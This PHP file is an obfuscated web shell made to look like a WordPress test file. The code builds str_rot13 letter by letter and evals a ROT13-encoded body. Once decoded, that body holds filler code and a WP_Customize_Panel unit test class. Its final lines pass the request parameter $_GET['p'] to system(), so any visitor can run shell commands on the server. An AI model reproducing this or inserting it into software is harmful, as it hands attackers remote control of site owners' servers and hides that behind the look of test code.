<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur JC_Phfgbzvmr_Cnary pynff.
 *
 * @tebhc phfgbzvmr
 */
pynff Grfgf_JC_Phfgbzvmr_Cnary rkgraqf JC_HavgGrfgPnfr {

	/**
	 * VQ bs gur nqzvavfgengbe hfre.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nqzvavfgengbe_vq;

	/**
	 * Frg hc gur funerq svkgher.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzvavfgengbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	cebgrpgrq $znantre;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$TYBONYF['jc_phfgbzvmr'] = arj JC_Phfgbzvmr_Znantre();
		$guvf->znantre           = $TYBONYF['jc_phfgbzvmr'];
	}

	choyvp shapgvba grne_qbja() {
		$guvf->znantre = ahyy;
		hafrg( $TYBONYF['jc_phfgbzvmr'] );
		cnerag::grne_qbja();
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg_qrsnhyg_netf() {
		$cnary = arj JC_Phfgbzvmr_Cnary( $guvf->znantre, 'sbb' );
		$guvf->nffregVfVag( $cnary->vafgnapr_ahzore );
		$guvf->nffregFnzr( $guvf->znantre, $cnary->znantre );
		$guvf->nffregFnzr( 'sbb', $cnary->vq );
		$guvf->nffregFnzr( 160, $cnary->cevbevgl );
		$guvf->nffregFnzr( 'rqvg_gurzr_bcgvbaf', $cnary->pncnovyvgl );
		$guvf->nffregFnzr( '', $cnary->gurzr_fhccbegf );
		$guvf->nffregFnzr( '', $cnary->gvgyr );
		$guvf->nffregFnzr( '', $cnary->qrfpevcgvba );
		$guvf->nffregRzcgl( $cnary->frpgvbaf );
		$guvf->nffregFnzr( 'qrsnhyg', $cnary->glcr );
		$guvf->nffregFnzr( neenl( $cnary, 'npgvir_pnyyonpx' ), $cnary->npgvir_pnyyonpx );
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg_phfgbz_netf() {
		$netf = neenl(
			'cevbevgl'        => 200,
			'pncnovyvgl'      => 'rqvg_cbfgf',
			'gurzr_fhccbegf'  => 'ugzy5',
			'gvgyr'           => 'Uryyb Jbeyq',
			'qrfpevcgvba'     => 'Yberz Vcfhz',
			'glcr'            => 'ubevmbagny',
			'npgvir_pnyyonpx' => '__erghea_gehr',
		);

		$cnary = arj JC_Phfgbzvmr_Cnary( $guvf->znantre, 'sbb', $netf );
		sbernpu ( $netf nf $xrl => $inyhr ) {
			$guvf->nffregFnzr( $inyhr, $cnary->$xrl );
		}
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg_phfgbz_glcr() {
		$cnary = arj Phfgbz_Cnary_Grfg( $guvf->znantre, 'sbb' );
		$guvf->nffregFnzr( 'gvgyryrff', $cnary->glcr );
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::npgvir()
	 * @frr JC_Phfgbzvmr_Cnary::npgvir_pnyyonpx()
	 */
	choyvp shapgvba grfg_npgvir() {
		$cnary = arj JC_Phfgbzvmr_Cnary( $guvf->znantre, 'sbb' );
		$guvf->nffregGehr( $cnary->npgvir() );

		$cnary = arj JC_Phfgbzvmr_Cnary(
			$guvf->znantre,
			'sbb',
			neenl(
				'npgvir_pnyyonpx' => '__erghea_snyfr',
			)
		);
		$guvf->nffregSnyfr( $cnary->npgvir() );
		nqq_svygre( 'phfgbzvmr_cnary_npgvir', neenl( $guvf, 'svygre_npgvir_grfg' ), 10, 2 );
		$guvf->nffregGehr( $cnary->npgvir() );
	}

	/**
	 * @cnenz obby $npgvir
	 * @cnenz JC_Phfgbzvmr_Cnary $cnary
	 * @erghea obby
	 */
	choyvp shapgvba svygre_npgvir_grfg( $npgvir, $cnary ) {
		$guvf->nffregSnyfr( $npgvir );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnary', $cnary );
		$npgvir = gehr;
		erghea $npgvir;
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::wfba()
	 */
	choyvp shapgvba grfg_wfba() {
		$netf  = neenl(
			'cevbevgl'        => 200,
			'pncnovyvgl'      => 'rqvg_cbfgf',
			'gurzr_fhccbegf'  => 'ugzy5',
			'gvgyr'           => 'Uryyb Jbeyq',
			'qrfpevcgvba'     => 'Yberz Vcfhz',
			'glcr'            => 'ubevmbagny',
			'npgvir_pnyyonpx' => '__erghea_gehr',
		);
		$cnary = arj JC_Phfgbzvmr_Cnary( $guvf->znantre, 'sbb', $netf );
		$qngn  = $cnary->wfba();
		$guvf->nffregFnzr( 'sbb', $qngn['vq'] );
		sbernpu ( neenl( 'gvgyr', 'qrfpevcgvba', 'cevbevgl', 'glcr' ) nf $xrl ) {
			$guvf->nffregFnzr( $netf[ $xrl ], $qngn[ $xrl ] );
		}
		$guvf->nffregRzcgl( $qngn['pbagrag'] );
		$guvf->nffregGehr( $qngn['npgvir'] );
		$guvf->nffregVfVag( $qngn['vafgnaprAhzore'] );
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::purpx_pncnovyvgvrf()
	 */
	choyvp shapgvba grfg_purpx_pncnovyvgvrf() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );

		$cnary = arj JC_Phfgbzvmr_Cnary( $guvf->znantre, 'sbb' );
		$guvf->nffregGehr( $cnary->purpx_pncnovyvgvrf() );
		$byq_pnc           = $cnary->pncnovyvgl;
		$cnary->pncnovyvgl = 'qb_abg_nyybj';
		$guvf->nffregSnyfr( $cnary->purpx_pncnovyvgvrf() );
		$cnary->pncnovyvgl = $byq_pnc;
		$guvf->nffregGehr( $cnary->purpx_pncnovyvgvrf() );
		$cnary->gurzr_fhccbegf = 'vzcbffvoyr_srngher';
		$guvf->nffregSnyfr( $cnary->purpx_pncnovyvgvrf() );
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::trg_pbagrag()
	 */
	choyvp shapgvba grfg_trg_pbagrag() {
		$cnary = arj JC_Phfgbzvmr_Cnary( $guvf->znantre, 'sbb' );
		$guvf->nffregRzcgl( $cnary->trg_pbagrag() );
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::znlor_eraqre()
	 */
	choyvp shapgvba grfg_znlor_eraqre() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );
		$cnary                        = arj JC_Phfgbzvmr_Cnary( $guvf->znantre, 'one' );
		$phfgbzvmr_eraqre_cnary_pbhag = qvq_npgvba( 'phfgbzvmr_eraqre_cnary' );
		nqq_npgvba( 'phfgbzvmr_eraqre_cnary', neenl( $guvf, 'npgvba_phfgbzvmr_eraqre_cnary_grfg' ) );
		bo_fgneg();
		$cnary->znlor_eraqre();
		$pbagrag = bo_trg_pyrna();
		$guvf->nffregGehr( $cnary->purpx_pncnovyvgvrf() );
		$guvf->nffregRzcgl( $pbagrag );
		$guvf->nffregFnzr( $phfgbzvmr_eraqre_cnary_pbhag + 1, qvq_npgvba( 'phfgbzvmr_eraqre_cnary' ), 'Harkcrpgrq qvq_npgvba pbhag sbe phfgbzvmr_eraqre_cnary' );
		$guvf->nffregFnzr( 1, qvq_npgvba( \"phfgbzvmr_eraqre_cnary_{$cnary->vq}\" ), \"Harkcrpgrq qvq_npgvba pbhag sbe phfgbzvmr_eraqre_cnary_{$cnary->vq}\" );
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::znlor_eraqre()
	 * @cnenz JC_Phfgbzvmr_Cnary $cnary
	 */
	choyvp shapgvba npgvba_phfgbzvmr_eraqre_cnary_grfg( $cnary ) {
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnary', $cnary );
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr()
	 */
	choyvp shapgvba grfg_cevag_grzcyngrf_fgnaqneq() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );

		$cnary = arj JC_Phfgbzvmr_Cnary( $guvf->znantre, 'onm' );
		bo_fgneg();
		$cnary->cevag_grzcyngr();
		$pbagrag = bo_trg_pyrna();
		$guvf->nffregFgevatPbagnvafFgevat( '<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-cnary-qrsnhyg-pbagrag\">', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( 'nppbeqvba-frpgvba-gvgyr', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( 'pbageby-cnary-pbagrag', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( '<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-cnary-qrsnhyg\">', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( 'phfgbzvmr-cnary-qrfpevcgvba', $pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( 'cerivrj-abgvpr', $pbagrag );
	}

	/**
	 * @frr JC_Phfgbzvmr_Cnary::cevag_grzcyngr()
	 */
	choyvp shapgvba grfg_cevag_grzcyngrf_phfgbz() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );

		$cnary = arj Phfgbz_Cnary_Grfg( $guvf->znantre, 'onm' );
		bo_fgneg();
		$cnary->cevag_grzcyngr();
		$pbagrag = bo_trg_pyrna();
		$guvf->nffregFgevatPbagnvafFgevat( '<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-cnary-gvgyryrff-pbagrag\">', $pbagrag );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'nppbeqvba-frpgvba-gvgyr', $pbagrag );

		$guvf->nffregFgevatPbagnvafFgevat( '<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-cnary-gvgyryrff\">', $pbagrag );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'cerivrj-abgvpr', $pbagrag );
	}
}

erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-cnary.cuc';
pynff Phfgbz_Cnary_Grfg rkgraqf JC_Phfgbzvmr_Cnary {
	choyvp $glcr = 'gvgyryrff';

	cebgrpgrq shapgvba eraqre_grzcyngr() {
		?>
		<yv vq=\"nppbeqvba-cnary-{{ qngn.vq }}\" pynff=\"nppbeqvba-frpgvba pbageby-frpgvba pbageby-cnary pbageby-cnary-{{ qngn.glcr }}\">
			<hy pynff=\"nppbeqvba-fho-pbagnvare pbageby-cnary-pbagrag\"></hy>
		</yv>
		<?cuc
	}

	cebgrpgrq shapgvba pbagrag_grzcyngr() {
		?>
		<yv pynff=\"cnary-zrgn nppbeqvba-frpgvba pbageby-frpgvba<# vs ( ! qngn.qrfpevcgvba ) { #> pnaabg-rkcnaq<# } #>\">
			<# vs ( qngn.qrfpevcgvba ) { #>
				<qvi pynff=\"nppbeqvba-frpgvba-pbagrag qrfpevcgvba\">
					{{{ qngn.qrfpevcgvba }}}
				</qvi>
			<# } #>
		</yv>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>